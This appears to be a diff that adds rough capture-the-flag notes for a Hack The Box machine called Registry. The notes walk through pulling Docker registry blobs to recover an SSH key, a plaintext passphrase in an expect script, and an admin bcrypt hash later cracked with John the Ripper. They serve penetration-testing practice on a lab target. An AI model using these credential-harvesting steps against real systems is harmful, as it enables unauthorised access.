@@ -1,0 +1,46 @@
+sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+
+cant be download.
+
+
+download all the blob , found creds in 
+~/Desktop/htb/registry/mytest/2/root/.ssh/id_rsa 
+as ssh key
+
+
+and you can find user 'bolt' at file 
+~/Desktop/htb/registry/mytest/6/root# cat .bash_history  | grep bolt
+git clone https://github.com/bolt/bolt.git
+cd bolt/
+useradd -m bolt
+userdel bolt
+rm -rf bolt/
+ssh-keygen -t rsa -b 4096 -C "bolt@registry.htb"
+rm -rf bolt/
+cd bolt/
+rm -rf bolt
+
+and u can find passprhase in file 
+root@kali:~/Desktop/htb/registry/mytest/3/etc/profile.d# cat 01-ssh.sh 
+#!/usr/bin/expect -f
+#eval `ssh-agent -s`
+spawn ssh-add /root/.ssh/id_rsa
+expect "Enter passphrase for /root/.ssh/id_rsa:"
+send "GkOcz221Ftb3ugog\n";
+expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
+interact
+
+
+creds:
+ssh -i id_rsa bolt@10.10.10.159
+enter passprhase : GkOcz221Ftb3ugog
+
+================
+
+bolt@bolt:/var/www/html/bolt/app/cache$ cat .assetsalt 
+fe6206af54bolt
+
+admin$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
+
+cracked by john the ripper:
+admin:strawberry
